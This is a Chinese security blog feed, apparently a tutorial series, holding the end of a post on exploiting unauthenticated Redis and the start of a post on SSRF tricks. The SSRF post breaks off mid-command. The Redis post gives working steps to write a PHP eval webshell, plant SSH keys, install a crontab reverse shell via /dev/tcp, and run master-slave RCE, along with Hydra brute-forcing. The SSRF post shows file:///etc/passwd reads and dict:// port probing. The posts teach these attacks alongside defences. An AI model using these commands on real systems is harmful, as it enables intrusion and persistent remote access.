title="安全配置密码验证"></a>安全配置密码验证</h3><p>我们可以通过Redis的配置文件设置密码参数，这样客户端连接到Redis服务就需要密码验证，这样可以让你的Redis服务更安全，进而杜绝了未授权访问漏洞。</p><p>我们可以通过以下命令查看是否设置了密码验证：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;&quot;</span><br></pre></td></tr></table></figure><p>默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。</p><p>你可以通过以下命令来修改该参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG set requirepass &quot;runoob&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;runoob&quot;</span><br></pre></td></tr></table></figure><p>设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。</p><p>密码验证用到AUTH命令，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; AUTH &quot;password&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SET mykey &quot;Test value&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; GET mykey</span><br><span class="line">&quot;Test value&quot;</span><br></pre></td></tr></table></figure><h2 id="0x02-Redis漏洞攻击利用"><a href="#0x02-Redis漏洞攻击利用" class="headerlink" title="0x02 Redis漏洞攻击利用"></a>0x02 Redis漏洞攻击利用</h2><p>Redis漏洞包括未授权访问漏洞所引起的一系列深入攻击利用以及其他一些已知的Redis CVE漏洞。</p><p>在旧版本中Redis默认配置的服务是监听在公网的，而在最近这些新版本中都默认将监听地址改为本地监听，即前面redis.conf中看到的<code>bind 127.0.0.1</code>。</p><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>由于配置不当的原因，导致Redis服务暴露在公网（即绑定在0.0.0.0:6379），并且没有开启相关认证和添加相关安全策略的情况下，即存在未授权访问漏洞。</p><p>攻击者在未授权访问Redis的情况下，可以获取数据库的所有数据、删除数据库数据等，进一步地可以利用Redis相关方法来实现写入WebShell、写入Crontab定时任务、写入SSH公钥以及利用主从复制RCE等一系列的攻击利用，将Redis未授权访问漏洞的危害无限放大。</p><h4 id="敏感信息泄露与数据库内容删除"><a href="#敏感信息泄露与数据库内容删除" class="headerlink" title="敏感信息泄露与数据库内容删除"></a>敏感信息泄露与数据库内容删除</h4><p>使用Redis的语句可以获取数据库中的存储的敏感信息，这里为了方便直接通过<code>keys *</code>来获取所有的键，然后通过get命令获取键值（如果在实际的业务中，一般不会查询所有键，因为对性能影响太大了，而是通过查询指定的某些数据库内容）：</p><p><img src="/2020/03/05/Redis安全小结/1.png" alt=""></p><p>使用info命令可以看到Redis的版本、OS内核版本、配置文件路径等信息：</p><p><img src="/2020/03/05/Redis安全小结/2.png" alt=""></p><p>使用flushall等相关命令可以将Redis数据库所有内容删除掉，注意要慎用：</p><p><img src="/2020/03/05/Redis安全小结/3.png" alt=""></p><h4 id="向Web目录写入WebShell"><a href="#向Web目录写入WebShell" class="headerlink" title="向Web目录写入WebShell"></a>向Web目录写入WebShell</h4><p>前提是Redis所在机子开启了Web服务，且已知Web服务目录路径。</p><p>原理就是在Redis中插入一条数据，将WebShell代码作为value，key值随意，然后通过修改数据库的默认路径为Web服务目录和默认的缓存文件为WebShell文件，最后通过save命令以备份的方式把缓存的数据保存在文件里，这样就可以在服务器端的Web目录下生成一个WebShell文件。</p><p>具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set payload &quot;&lt;?php @eval($_POST[c]);?&gt;&quot;</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/4.png" alt=""></p><p>在服务端看到生成的shell.php内容如下，可以看到PHP代码穿插其中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REDIS0007�redis-ver3.2.11�</span><br><span class="line">redis-bits�@�ctime� c^used-mem�h�</span><br><span class="line">                                  ��payload&lt;?php @eval($_POST[c]);?&gt;�hUuϞ^</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/5.png" alt=""></p><p>由于PHP的容错性，该PHP代码是能正常执行的，能正常getshell：</p><p><img src="/2020/03/05/Redis安全小结/6.png" alt=""></p><h4 id="写入SSH公钥直接登录"><a href="#写入SSH公钥直接登录" class="headerlink" title="写入SSH公钥直接登录"></a>写入SSH公钥直接登录</h4><p>前提是Redis服务是以root权限运行的。</p><p>原理和前面一样的，只是备份的目录和文件名修改为/root/.ssh/目录和authorized_keys文件名。</p><p>先在Ubuntu中生成公私钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/7.png" alt=""></p><p>获取公钥内容<code>cat /home/ski12/.ssh/id_rsa.pub</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/8.png" alt=""></p><p>通过Redis客户端将公钥内容写入到/root/.ssh/authorized_keys文件中，注意保存key的时候加上两个<code>\n</code>是为了避免和Redis里其他缓存数据混合：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set payload &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCezjyBJJ+qsrow5bFZT4/ezNQPmNQPkrQ7VfYIrU5q2NmGwQ/AAU3uL6FRCF3NsU8g3eudncLMw1qQTsTGKW4xI6DDjcszUjCX/vl+KoAlfIlH3+EOV/n8JbGnBMud/FeMTSGvEfw6yPTLIHH9nBwWHVitBoP2kM86eAyeKAGNjtHlPnPF+RMX0oNaijAgJqC3z/Ar2RMf6luwdrVYTBHFZ9ZF51lOJ1xlfHJDVV0VbDhSgZil6eIrEcG8I/tshaWkTAyfxq/2VjMXXU4/JTlxrMqbR5xvL/sC88Yexy07KYdEkFfvmn2XCeT0sM00OB+SlYBqrf1h3XIS1j//uFP5 ski12@ubuntu\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/9.png" alt=""></p><p>为了不用自己复制粘贴公钥内容，换种形式也OK：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; m7.txt</span><br><span class="line">cat m7.txt | redis-cli -h 192.168.10.137 -p 6379 <span class="built_in">set</span> payload</span><br></pre></td></tr></table></figure><p>此时看到Kali中的/root/.ssh/目录中成功生成了authorized_keys文件的：</p><p><img src="/2020/03/05/Redis安全小结/10.png" alt=""></p><p>注意，如果Kali中的SSH服务还没开启的话，通过如下命令开启即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start ssh</span><br></pre></td></tr></table></figure><p>接着在Ubuntu上使用私钥直接SSH远程连接到Kali，得到shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.137</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/11.png" alt=""></p><h4 id="写入定时任务反弹shell"><a href="#写入定时任务反弹shell" class="headerlink" title="写入定时任务反弹shell"></a>写入定时任务反弹shell</h4><p>该方法只能CentOS上使用，Ubuntu、Debian上行不通。原因如下：</p><ul><li>权限问题，Ubuntu定时任务需要root权限；</li><li>Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；</li></ul><p>原理和前面是一样的，只是备份的目录和文件名修改了下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set payload &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.307/666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/13.png" alt=""></p><p>注意，不同类型、版本的OS的crontabs所在路径会有所区别。</p><p>可以看到在Kali中成功生成root文件，其中含有定时任务的内容，也包括了乱码：</p><p><img src="/2020/03/05/Redis安全小结/12.png" alt=""></p><p>此时并未在监听端接收到反弹shell。这是由于Kali是Debian系统，对定时任务的格式要求很严，而root文件内容含有乱码，会导致执行不成功。除此之外，还有root文件执行的权限问题，我们通过<code>tail /var/log/syslog</code>命令来查看如下错误信息，因为权限不够、所以cron拒绝执行该定时任务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cron[441]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/14.png" alt=""></p><p>具体CentOS的利用可自行测试。</p><p>不同OS的系统任务调度文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Debian</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine</span><br><span class="line">/etc/cron.d/xxx</span><br></pre></td></tr></table></figure><blockquote><p>可进行利用的cron有如下几个地方：</p><ul><li>/etc/crontab 这个是肯定的</li><li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li><li>/var/spool/cron/root centos系统下root用户的cron文件</li><li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li></ul></blockquote><h4 id="其他的利用"><a href="#其他的利用" class="headerlink" title="其他的利用"></a>其他的利用</h4><p>任何可利用Redis未授权访问漏洞来写文件的地方都能被进行恶意利用，除了前面几项利用方式外，还有以下收集的几个在Linux或Windows下的利用方式。</p><p>写入/etc/passwd文件实现任意账号密码重置：<a href="https://www.freebuf.com/vuls/148758.html#-etcpasswd" target="_blank" rel="noopener">https://www.freebuf.com/vuls/148758.html#-etcpasswd</a></p><p>写入Windows启动项：<a href="https://www.anquanke.com/post/id/170360#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-3</a></p><p>写入Windows MOF：<a href="https://www.anquanke.com/post/id/170360#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170360#h3-4</a></p><h3 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h3><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>如果把数据存储在单个Redis中，而读写体量比较大的时候，服务端的性能就会大受影响。为了应对这种情况，Redis就提供了主从模式。</p><p>Redis主从模式是指使用一个Redis作为主机，其他Redis则作为从机即备份机。其中主机和从机数据相同，主机只负责写，从机只负责读，通过读写分离可以大幅度减轻流量的压力，即是一种通过牺牲空间来换取效率的缓解方式。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>主从复制实现RCE还是属于未授权访问的一种利用方式，这里因为其较新型便单独提出一小节。</p><p>4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。</p><p>Redis主从数据库之间的同步分为两种：</p><ul><li>全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中；</li><li>部分复制只是将写命令发送给从机；</li></ul><p>因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。</p><p>这里我们只需要模拟协议收发包就能伪装成Redis主机了，利用工具如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br></pre></td></tr></table></figure><p>第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。</p><p>首先要生成恶意so文件，下载第一个工具然后make即可生成。</p><p>然后在攻击者机器上执行如下命令即可成功RCE：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.10.137 -p 6379 -L 192.168.10.141 -f module.so</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/Redis安全小结/15.png" alt=""></p><h3 id="用Hydra暴力破解Redis密码"><a href="#用Hydra暴力破解Redis密码" class="headerlink" title="用Hydra暴力破解Redis密码"></a>用Hydra暴力破解Redis密码</h3><p>使用Hydra工具可以对Redis密码进行暴力破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P /home/fragrant/sec_tools/w3af/w3af/core/controllers/bruteforce/passwords.txt redis://192.168.10.137</span><br></pre></td></tr></table></figure><h3 id="历史CVE漏洞"><a href="#历史CVE漏洞" class="headerlink" title="历史CVE漏洞"></a>历史CVE漏洞</h3><h4 id="Redis远程代码执行漏洞（CVE-2016-8339）"><a href="#Redis远程代码执行漏洞（CVE-2016-8339）" class="headerlink" title="Redis远程代码执行漏洞（CVE-2016-8339）"></a>Redis远程代码执行漏洞（CVE-2016-8339）</h4><p>Redis 3.2.x &lt; 3.2.4 版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，从而RCE。</p><h4 id="CVE-2015-8080"><a href="#CVE-2015-8080" class="headerlink" title="CVE-2015-8080"></a>CVE-2015-8080</h4><p>Redis版本 2.8.x &lt; 2.8.24 和 3.0.x &lt; 3.0.6 中，lua_struct.c中的getnum函数存在整数溢出漏洞，导致攻击者可以运行Lua代码或可能绕过沙盒限制。</p><h4 id="CVE-2015-4335"><a href="#CVE-2015-4335" class="headerlink" title="CVE-2015-4335"></a>CVE-2015-4335</h4><p>Redis 2.8.1 之前版本和 3.0.2 之前版本中存在安全漏洞，攻击者可以远程执行eval命令，利用该漏洞执行任意Lua字节码。</p><h4 id="CVE-2013-7458"><a href="#CVE-2013-7458" class="headerlink" title="CVE-2013-7458"></a>CVE-2013-7458</h4><p>读取”.rediscli_history”配置文件信息。</p><h3 id="不存在NoSQL注入问题？"><a href="#不存在NoSQL注入问题？" class="headerlink" title="不存在NoSQL注入问题？"></a>不存在NoSQL注入问题？</h3><p>目前来说是的。</p><p>Redis客户端在与Redis服务端进行通信时，会使用RESP（REdis Serialization Protocol）协议。Redis客户端对所有的命令进行格式化处理，将不同参数组成的命令转换为符合RESP协议格式的数据，发送给Redis服务端的所有参数都是二进制安全的。</p><p>以下是RESP协议的通用形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&lt;number of arguments&gt; CR LF</span><br><span class="line">$&lt;number of bytes of argument 1&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br><span class="line">...</span><br><span class="line">$&lt;number of bytes of argument N&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br></pre></td></tr></table></figure><p>例子如下，原本命令为<code>SET mykey myvalue</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">SET</span><br><span class="line">$5</span><br><span class="line">mykey</span><br><span class="line">$7</span><br><span class="line">myvalue</span><br></pre></td></tr></table></figure><p>Redis客户端格式化后的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$7\r\nmyvalue\r\n&quot;</span><br></pre></td></tr></table></figure><p>Redis协议里面没有字符串转义相关的内容，Redis协议使用的是前缀长度的字符串，完全二进制，保证安全性，所以是不存在NoSQL注入的。</p><p>Lua脚本执行EVAL和EVALSHA命令时遵循相同的规则，因此这些命令也是安全的。</p><p>Redis协议规范可参考：<a href="http://www.redis.cn/topics/protocol.html" target="_blank" rel="noopener">http://www.redis.cn/topics/protocol.html</a></p><p>Redis通信过程分析可参考：<a href="https://draveness.me/redis-cli" target="_blank" rel="noopener">https://draveness.me/redis-cli</a></p><h2 id="0x03-漏洞组合拳"><a href="#0x03-漏洞组合拳" class="headerlink" title="0x03 漏洞组合拳"></a>0x03 漏洞组合拳</h2><p>一些比较鸡肋的Web漏洞，在和本地Redis未授权访问漏洞组合进行深入利用后，往往会将危害达到最大化。</p><h3 id="SSRF打本地Redis服务"><a href="#SSRF打本地Redis服务" class="headerlink" title="SSRF打本地Redis服务"></a>SSRF打本地Redis服务</h3><p>前提是Web服务器监听本地的Redis存在未授权访问漏洞，并且Web站点支持Gopher协议。这里就能把范围缩小了，PHP是支持Gopher协议的，而Java不支持。</p><p>具体可参考：<a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用 Gopher 协议拓展攻击面</a></p><h3 id="Python-urllib-CRLF注入打本地Redis服务"><a href="#Python-urllib-CRLF注入打本地Redis服务" class="headerlink" title="Python urllib CRLF注入打本地Redis服务"></a>Python urllib CRLF注入打本地Redis服务</h3><p>如果目标站点使用了Python漏洞版本的urllib库，并且请求的url外部可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问漏洞的Redis，那么服务器就存在被getshell的风险。</p><p>原理和组合SSRF漏洞完全一样，通过CRLF注入来利用Redis向Crontab写入反弹shell的定时任务。</p><p>具体可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul><li>禁止公网开放Redis服务，可以在防火墙上禁用6379端口；</li><li>修改Redis服务端口为其他非常见的端口号；</li><li>配置Redis的密码访问验证；</li><li>禁用不使用的高危命令；</li><li>重命名高危命令的名称；</li><li>以低权限运行Redis服务，禁止用root等最高权限运行；</li><li>确保authorized_keys文件的安全，尽量阻止其他用户添加新的公钥；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.freebuf.com/vuls/224235.html" target="_blank" rel="noopener">记一次Redis+Getshell经验分享</a></p><p><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/" target="_blank" rel="noopener">Redis 基于主从复制的RCE利用方式</a></p><p><a href="https://zhuanlan.zhihu.com/p/75627194" target="_blank" rel="noopener">redis未授权访问漏洞利用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Redis" scheme="https://www.mi1k7ea.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>SSRF Tricks小结</title>
    <link href="https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks小结/</id>
    <published>2020-02-29T15:53:30.000Z</published>
    <updated>2020-03-08T09:08:08.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSRF漏洞原理很简单，这里只整理下SSRF的一些绕过技巧以及在不同语言下的细微差别。</p><h2 id="0x01-SSRF-in-PHP"><a href="#0x01-SSRF-in-PHP" class="headerlink" title="0x01 SSRF in PHP"></a>0x01 SSRF in PHP</h2><h3 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h3><p>在PHP中，涉及到SSRF漏洞的函数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>其中有如下几个注意点：</p><ul><li>大部分PHP并不会开启fsockopen()的Gopher Wrapper；</li><li>file_get_contents()的Gopher协议不能进行URLencode；</li><li>file_get_contents()关于Gopher的302跳转有bug，会导致利用失败；</li><li>file_get_contents()支持php://input协议；</li><li>curl/libcurl 7.43版本上Gopher协议存在bug即%00截断，经测试7.49版本可用；</li><li>curl_exec()默认不跟踪跳转；</li></ul><p>curl_exec()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure><p>file_get_contents()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = $_GET[<span class="string">'url'</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br></pre></td></tr></table></figure><p>fsockopen()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) </span><br><span class="line">        &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>在PHP中能够进行SSRF攻击利用的协议：</p><ul><li>http/https：主要用来探测内网服务，根据响应的状态判断内网端口及服务，可以结合如Struts2的RCE来实现攻击；</li><li>file：读取服务器上的任意文件内容；</li><li>dict：除了泄露安装软件版本信息，还可以查看端口，操作内网Redis服务等；</li><li>gopher：能够将所有操作转换成数据流，并将数据流一次发送出去，可以用来探测内网的所有服务的所有漏洞，可利用来攻击Redis和PHP-FPM；</li><li>ftp/ftps：FTP匿名访问、爆破；</li><li>tftp：UDP协议扩展，发送UDP报文；</li><li>imap/imaps/pop3/smtp/smtps：爆破邮件用户名密码；</li><li>telnet：SSH/Telnet匿名访问及爆破；</li></ul><h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>PHP中的curl_exec()函数导致的SSRF漏洞在CTF中是经常遇到的，该函数会执行cURL会话。</p><p>可以通过<code>curl -V</code>命令查看curl版本及其支持的协议类型：</p><p><img src="/2020/02/29/SSRF-Tricks小结/1.png" alt=""></p><p>可以看到，我本地kali的是支持dict、file、gopher等等协议的。因此本地利用可使用上述几个协议。</p><p>注意：Windows使用curl命令需要把单引号换成双引号。</p><h4 id="file-协议任意读文件"><a href="#file-协议任意读文件" class="headerlink" title="file://协议任意读文件"></a>file://协议任意读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;file:///etc/passwd&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/2.png" alt=""></p><h4 id="dict-协议探测端口及banner信息"><a href="#dict-协议探测端口及banner信息" class="headerlink" title="dict://协议探测端口及banner信息"></a>dict://协议探测端口及banner信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22&apos;</span><br><span class="line">curl -v &apos;dict://127.0.0.1:6379/info&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/3.png" alt=""></p><h4 id="gopher-协议反弹shell"><a href="#gopher-协议反弹shell" class="headerlink" title="gopher://协议反弹shell"></a>gopher://协议反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v 